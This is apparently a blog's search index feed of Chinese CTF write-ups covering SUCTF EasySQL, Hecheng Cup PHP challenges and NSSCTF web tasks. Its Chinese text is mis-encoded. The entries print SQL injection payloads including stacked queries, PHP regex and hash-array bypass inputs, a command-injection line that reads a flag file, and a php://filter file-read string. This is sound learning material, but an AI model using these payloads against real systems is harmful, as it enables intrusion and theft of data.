<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>suctf 2019 EasySQL</title>
      <link href="/2021/10/10/nss/0/"/>
      <url>/2021/10/10/nss/0/</url>
      
        <content type="html"><![CDATA[<p> å‚è€ƒé“¾æ¥ï¼š</p><p>[<a href="https://www.cnblogs.com/peri0d/p/11598597.html">SUCTF 2019]EasySQL - peri0d - åšå®¢å›­ (cnblogs.com)</a></p><p>[(4æ¡æ¶ˆæ¯) <a href="https://blog.csdn.net/m0_55771794/article/details/118709290">SUCTF 2019]EasySQL_m0_55771794çš„åšå®¢-CSDNåšå®¢</a></p><p>æ‰“å¼€é¡µé¢</p><p><img src="/2021/10/10/nss/0/image-20211010193758035.png" alt="image-20211010193758035"></p><p>å…ˆè¯•è¯•åŸºæœ¬çš„æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;##orè¯­å¥</span><br><span class="line">1&#39; order by 3##orderè¯­å¥</span><br><span class="line">1&#39; union select 1,2,3##è”åˆæŸ¥è¯¢</span><br><span class="line">1&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))#æŠ¥é”™æ³¨å…¥</span><br><span class="line">1&#39; and if(length(database())&gt;1,sleep(5),1)--+#æ—¶é—´æ³¨å…¥</span><br></pre></td></tr></table></figure><p>ç»“æœéƒ½æ˜¯ä¸‹å›¾</p><p><img src="/2021/10/10/nss/0/image-20211010194231781.png" alt="image-20211010194231781"></p><p>è¯•åˆ°å †å æ³¨å…¥æ—¶æˆåŠŸäº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show databases#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194353961.png" alt="image-20211010194353961"></p><p>ç»§ç»­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show tables#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194430322.png" alt="image-20211010194430322"></p><p>å°±åœ¨æˆ‘ä»¥ä¸ºå®Œäº‹å¤§å‰çš„æ—¶å€™</p><p>ç°å®ç»™æˆ‘å½“å¤´ä¸€æ£’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;show columns from &#39;Flag&#39;#</span><br></pre></td></tr></table></figure><p><img src="/2021/10/10/nss/0/image-20211010194709636.png" alt="image-20211010194709636"></p><p>çœ‹äº†wpæ‰çŸ¥é“ï¼ŒåŸæ¥æ˜¯è¦å»çŒœæµ‹å‡ºæœ¬æ¥çš„sqlè¯­å¥æŸ¥è¯¢æ—¶ä»€ä¹ˆæ ·çš„</p><p><strong>select $_POST[â€˜queryâ€™] || flag from Flag</strong></p><p>sql_mode è®¾ç½®äº† PIPES_AS_CONCAT æ—¶ï¼Œ|| å°±æ˜¯å­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼Œç›¸å½“äºCONCAT() å‡½æ•°<br>å½“ sql_mode æ²¡æœ‰è®¾ç½® PIPES_AS_CONCAT æ—¶ ï¼ˆé»˜è®¤æ²¡æœ‰è®¾ç½®ï¼‰ï¼Œ|| å°±æ˜¯é€»è¾‘æˆ–ï¼Œç›¸å½“äºORå‡½æ•°<br>ç¬¬ä¸€ç§å°±æŒ‰é»˜è®¤æ²¡æœ‰é…ç½®æ¥è¿›è¡Œï¼Œæ­¤æ—¶||å°±æ˜¯é€»è¾‘æˆ–<br>||åœ¨å‘½ä»¤æ‰§è¡Œä¸­è§è¿‡ï¼Œ<br>å›é¡¾:<br>command1;command2é¡ºåºæ‰§è¡Œ<br>command1 || command2<br>å¦‚æœcommand1æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œcommand2<br>command1 &amp;&amp; command2<br>å¦‚æœcommand1æ‰§è¡ŒæˆåŠŸï¼Œåˆ™æ‰§è¡Œcommand2</p><p>å› æ­¤åªéœ€è¦å°†</p><p>$_POST[â€˜queryâ€™]<br>æäº¤çš„æ•°æ®æ¢æˆ*,1(å¦‚æœç›´æ¥å†™çš„è¯ä¼šè¢«æŠ¥é”™ï¼Œä¸”å†™åœ¨åé¢ä¼šå¤±æ•ˆ)<br>è§£é‡Š:<br>sql=select.post[â€˜queryâ€™].â€||flag from Flagâ€;ï¼ˆæ‹¼æ¥è¯­å¥ï¼‰<br>å¦‚æœ$post[â€˜queryâ€™]çš„æ•°æ®ä¸º</p><p>*,1<br>sqlè¯­å¥å°±å˜æˆäº†select *,1||flag from Flagï¼Œ<br>å°±æ˜¯select *,1 from Flagï¼Œè¿™æ ·å°±ç›´æ¥æŸ¥è¯¢å‡ºäº†Flagè¡¨ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚<br>æ­¤å¤„çš„1æ˜¯ä¸´æ—¶å¢åŠ ä¸€åˆ—ï¼Œåˆ—åä¸º1ä¸”è¿™ä¸€åˆ—çš„æ‰€æœ‰å€¼éƒ½ä¸º1</p><p>æ‰§è¡Œpayloadï¼š*,1</p><p><img src="/2021/10/10/nss/0/image-20211010195151922.png" alt="image-20211010195151922"></p><p>å¾—åˆ°flag</p><ul><li><p>å®˜æ–¹ç»™çš„ payload æ˜¯ <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p></li><li><p>æ‹¼æ¥ä¸€ä¸‹å°±æ˜¯ <code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code></p></li><li><p>å…³äº <code>sql_mode</code> : å®ƒå®šä¹‰äº† MySQL åº”æ”¯æŒçš„ SQL è¯­æ³•ï¼Œä»¥åŠåº”è¯¥åœ¨æ•°æ®ä¸Šæ‰§è¡Œä½•ç§ç¡®è®¤æ£€æŸ¥ï¼Œå…¶ä¸­çš„ <code>PIPES_AS_CONCAT</code> å°† <code>||</code> è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œé â€œæˆ–â€ è¿ç®—ç¬¦</p></li><li><p>å…³äº <code>sql_mode</code> æ›´å¤šå¯ä»¥æŸ¥çœ‹è¿™ä¸ªé“¾æ¥ : <a href="https://www.cnblogs.com/piperck/p/9835695.html">MySQL sql_mode è¯´æ˜</a></p></li><li><p>è¿˜æœ‰å°±æ˜¯è¿™ä¸ªæ¨¡å¼ä¸‹è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œä½¿ç”¨å­—æ¯è¿æ¥ä¼šæŠ¥é”™ï¼Œä½¿ç”¨æ•°å­—è¿æ¥æ‰ä¼šæŸ¥è¯¢å‡ºæ•°æ®ï¼Œå› ä¸ºè¿™ä¸ª <code>||</code> ç›¸å½“äºæ˜¯å°† <code>select 1</code> å’Œ <code>select flag from flag</code> çš„ç»“æœæ‹¼æ¥åœ¨ä¸€èµ·</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021é¹¤åŸæ¯</title>
      <link href="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
      <url>/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<pre><code> è¿™æ¬¡çš„æ¯”èµ›è™½ç„¶å¬è¯´éƒ½æ˜¯åŸé¢˜ï¼Œä½†æ˜¯åŸºæœ¬æ²¡é‡åˆ°è¿‡ï¼Œè¿™æ¬¡çœ‹ç€writeupæ€»ç»“ä¸€ä¸‹</code></pre><p> å¤ç°ä¸€ä¸‹æŸäº›é¢˜ç›®</p><h3 id="Middle-magic"><a href="#Middle-magic" class="headerlink" title="Middle magic"></a>Middle magic</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./result.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;aaa&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;aaa&#x27;</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $aaa = preg_replace(<span class="string">&#x27;/^(.*)level(.*)$/&#x27;</span>, <span class="string">&#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;</span>, $_GET[<span class="string">&#x27;aaa&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/pass_the_level_1#/&#x27;</span>, $aaa))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;here is level 2&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($_POST[<span class="string">&#x27;admin&#x27;</span>] == $_POST[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                    $level_3 = json_decode($_POST[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> ($level_3-&gt;result == $result) &#123;</span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success:&quot;</span>.$flag;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;you never beat me!&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;out&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// perform validations on the form data</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nonono!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$aaa &#x3D; preg_replace(&#39;&#x2F;^(.*)level(.*)$&#x2F;&#39;, &#39;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#39;, $_GET[&#39;aaa&#39;]);</span><br><span class="line"></span><br><span class="line">   if(preg_match(&#39;&#x2F;pass_the_level_1#&#x2F;&#39;, $aaa))&#123;</span><br><span class="line">       echo &quot;here is level 2&quot;;</span><br></pre></td></tr></table></figure><p>getç±»å‹å–å¾—å˜é‡açš„å€¼ï¼Œæ­£åˆ™æ›¿æ¢å’ŒåŒ¹é…å‡½æ•°</p><p>è¿™é‡Œç›´æ¥ç”¨%0aå’Œ%23ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aaa&#x3D;%0apass_the_level_1%23</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;root_pwd&#x27;</span>])) &#123;</span><br><span class="line">           <span class="keyword">if</span> ($_POST[<span class="string">&#x27;admin&#x27;</span>] == $_POST[<span class="string">&#x27;root_pwd&#x27;</span>])</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">       <span class="comment">// START FORM PROCESSING    </span></span><br><span class="line">           <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_POST[<span class="string">&#x27;admin&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;root_pwd&#x27;</span>]))&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;here is level 3,do you kown how to overcome it?&quot;</span>;</span><br></pre></td></tr></table></figure><p>md5æ•°ç»„ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin[]&#x3D;1&amp;root_pwd[]&#x3D;2</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;level_3&#x27;</span>])) &#123;</span><br><span class="line">                  $level_3 = json_decode($_POST[<span class="string">&#x27;level_3&#x27;</span>]);</span><br><span class="line">                  </span><br><span class="line">                  <span class="keyword">if</span> ($level_3-&gt;result == $result) &#123;</span><br></pre></td></tr></table></figure><p>è¦ç»è¿‡js-encodeç¼–ç ä¸€ä¸‹ï¼Œè™½ç„¶æˆ‘ä»¬ä¸æ‡‚å€¼æ˜¯å¤šå°‘ï¼Œä½†å¼±ç­‰äºå°±å¥½äº†</p><p>ç›´æ¥{â€œresultâ€:0}</p><p>æœ€åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š?aaa&#x3D;%0apass_the_level_1%23</span><br><span class="line"></span><br><span class="line">POST:admin[]&#x3D;1&amp;root_pwd[]&#x3D;2&amp;level_3&#x3D;&#123;&quot;result&quot;:0&#125;</span><br></pre></td></tr></table></figure><h3 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h3><p>è¿™é¢˜å½“åˆåªæœ‰ç¨å¾®çœ‹äº†çœ‹ï¼Œæ²¡æƒ³åˆ°ç«Ÿç„¶æœ‰ç±»ä¼¼çš„åŸé¢˜</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($guess === $secret) &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/show_source/&#x27;</span>, $_SERVER[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å¼€å¤´å°±è®²æ˜åŒ…å«äº†utils.php</p><p>æ¥ç€POSTä¼ å‚ï¼Œæ¶‰åŠåˆ°å¥½å¤šè¿‡æ»¤</p><p>é‡‡ç”¨Y1ngå¤§ä½¬æ€è·¯ï¼š<a href="https://www.gem-love.com/ctf/1898.html">ğŸ‡¯ğŸ‡µzer0pts CTF 2020 Writeup â€“ é¢–å¥‡Lâ€™Amore (gem-love.com)</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;utils\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">    exit(&quot;hacker :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™çš„åŒ¹é… ban æ‰äº† config.phpã€‚ç„¶åä¼š <code>highlight_file()</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#39;show_source&#39;])) &#123;</span><br><span class="line">    highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">    exit();</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿™é‡ŒåŠ ä¸Šäº† <code>basename()</code> å¯èƒ½æ˜¯ä¸ºäº†è·¨ç›®å½•è¯»æ–‡ä»¶ï¼Œè€Œé—®é¢˜æ­£å¥½å‡ºåœ¨äº†è¿™é‡Œï¼Œ</p><p>æ¼”ç¤ºï¼š</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012193624036.png" alt="image-20211012193624036"></p><p>å¯ä»¥çœ‹åˆ°è¢«æŒ¡äº†ï¼Œä½†è‡³å°‘è¯´æ˜æˆ‘ä»¬æ€è·¯æ­£ç¡®</p><p>å½“æˆ‘è®¿é—® index.php æ—¶ï¼Œæˆ‘å¯ä»¥åœ¨åé¢åŠ ä¸Šä¸€äº›ä¸œè¥¿ï¼Œæ¯”å¦‚ /index.php/utils.phpï¼Œè¿™æ ·ä»ç„¶è®¿é—®çš„æ˜¯ index.phpï¼Œä½†ç»è¿‡ <code>basename()</code> åï¼Œä¼ è¿› <code>highlight_file()</code> å‡½æ•°çš„æ–‡ä»¶åå°±å˜æˆäº† utils.phpï¼Œå¦‚æœèƒ½ç»•è¿‡é‚£ä¸ªæ­£åˆ™ï¼Œå°±å¯ä»¥å¾—åˆ° utils.php æºç äº†ï¼Œè€Œé¢˜ç›®å‘Šè¯‰ FLAG å°±åœ¨ config.php é‡Œï¼Œè¿™é“é¢˜å°±åšå®Œäº†ã€‚</p><p>å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªæ­£åˆ™åŒ¹é…äº† utils.php/ ä¸º <code>$_SERVER[&#39;PHP_SELF&#39;]</code> çš„ç»“å°¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utils\.php\&#x2F;*$&#x2F;i</span><br></pre></td></tr></table></figure><p>è€å¥—è·¯äº†ï¼Œå¯ä»¥ç”¨ %0d ä¹‹ç±»çš„æ¥æ±¡æŸ“ç»•è¿‡ï¼Œè¿™æ ·ä»ç„¶è®¿é—®å¾—åˆ° index.php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;utils.php%0d</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹äº†å¤§ä½¬çš„wpï¼Œç›´æ¥æ‰“ï¼Ÿ</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194757043.png" alt="image-20211012194757043"></p><p>æˆ‘å¯¹è¿™ä¸ª%81ä¸æ˜¯å¾ˆç†è§£ï¼Œåœ¨æœ¬åœ°è¯•äº†ä¸€ä¸‹</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194837502.png" alt="image-20211012194837502"></p><p>è¿™ä¸ªç¬¦å·ï¼Ÿï¼Ÿï¼Ÿ</p><p>ä¸è¿‡è¿˜çœŸçš„ä¸€æ‰“å°±æˆï¼Œå¯æ˜¯åŸç†æˆ‘ä¸å¤ªæ‡‚å•Š</p><p><img src="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194930406.png" alt="image-20211012194930406"></p><p>è¿˜å¾—é—®é—®å¤§ä½¬</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF 2021 writeup</title>
      <link href="/2021/10/04/web/2/"/>
      <url>/2021/10/04/web/2/</url>
      
        <content type="html"><![CDATA[<p>å‚ä¸äº†ä¸€ä¸‹</p><p>æ–°ç”Ÿèµ›ï¼Œå‘ç°åŸºç¡€è¿˜ä¸å¤Ÿæ‰å®</p><p>é¡ºä¾¿è®°å½•ä¸€ä¸‹è§£é¢˜</p><h3 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h3><p><img src="/2021/10/04/web/2/image-20211004103854327.png"></p><p>æŒ‰ç…§é¢˜ç›®æç¤ºï¼ŒF12</p><p>æœ€å¼€å§‹æ— è„‘å¾€ä¸‹æ»‘ï¼Œè¢«å˜²è®½äº†ä¸€æ³¢</p><p><img src="/2021/10/04/web/2/image-20211004104026843.png" alt="image-20211004104026843"></p><p>æœ¬æ¥ä»¥ä¸ºè¿˜è¦æ§åˆ¶å°ä¿®æ”¹æ—¶é—´è·å–</p><p>ç»“æœå†å¾€ä¸Šæ‰¾æ‰¾å°±è¡Œ</p><p><img src="/2021/10/04/web/2/image-20211004104228392.png" alt="image-20211004104228392"></p><h3 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h3><p><img src="/2021/10/04/web/2/image-20211004104329873.png" alt="image-20211004104329873"></p><p>æç¤ºè¶³å¤Ÿæ˜æ˜¾äº†</p><p>ç›´æ¥è¿ï¼Œè¿™æ—¶å€™ç›´æ¥çŒœæƒ³åˆ°index.phpæ–‡ä»¶ï¼ˆä¹Ÿå¯ä»¥ä¸å«Œéº»çƒ¦dirsearchæ‰«ï¼‰</p><p>è¯•ç€è¿</p><p><img src="/2021/10/04/web/2/image-20211004104536627.png" alt="image-20211004104536627"></p><p>æˆåŠŸè¿ä¸Š</p><p><img src="/2021/10/04/web/2/image-20211004104630630.png" alt="image-20211004104630630"></p><h3 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h3><p>é¢˜å¦‚å…¶æ„ï¼Œå¾ˆç®€å•</p><p><img src="/2021/10/04/web/2/image-20211004104742735.png" alt="image-20211004104742735"></p><p><img src="/2021/10/04/web/2/image-20211004105437367.png" alt="image-20211004105437367"></p><p><img src="/2021/10/04/web/2/image-20211004105448146.png" alt="image-20211004105448146"></p><h3 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h3><p>è¿™é¢˜å¾ˆçœ¼ç†Ÿ</p><p>å¾ˆåƒä¹‹å‰åšè¿‡çš„</p><p><img src="/2021/10/04/web/2/image-20211004110036413.png" alt="image-20211004110036413"></p><p><img src="/2021/10/04/web/2/image-20211004110055171.png" alt="image-20211004110055171"></p><p>è¿™é‡ŒæŠ“åŒ…ä¼šè¢«å…‹åˆ¶</p><p>ç›´æ¥ç”¨hackbar</p><p><img src="/2021/10/04/web/2/image-20211004110238860.png" alt="image-20211004110238860"></p><h3 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h3><p><img src="/2021/10/04/web/2/image-20211004110322862.png" alt="image-20211004110322862"></p><p>æ•°ç»„ç»•è¿‡å³å¯</p><p><img src="/2021/10/04/web/2/image-20211004110433124.png" alt="image-20211004110433124"></p><h3 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h3><p>æ”¹ç±»å‹ä¸Šä¼ phpï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„</p><h3 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h3><p>ä¸Šä¼ phtmlé©¬æ–‡ä»¶ç»•è¿‡ï¼Œèšå‰‘è¿ä¸Š</p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>åŸºç¡€é¢˜ï¼Œç›´æ¥æŸ¥æ•°æ®åº“ï¼ŒæŸ¥è¡¨ï¼Œæœ€åæŸ¥å­—å</p><h3 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a></p><h3 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h3><p><img src="/2021/10/04/web/2/QQ%E5%9B%BE%E7%89%8720211004210427.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9&#x2F;flllllaaaaaaggggggg</span><br></pre></td></tr></table></figure><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>ä¼ªåè®®è¯»å–</p><p>php://filter/read=convert.base64.encode/resource=flag.php</p><p><a href="https://segmentfault.com/a/1190000018991087">PHPä¼ªåè®®æ€»ç»“ - 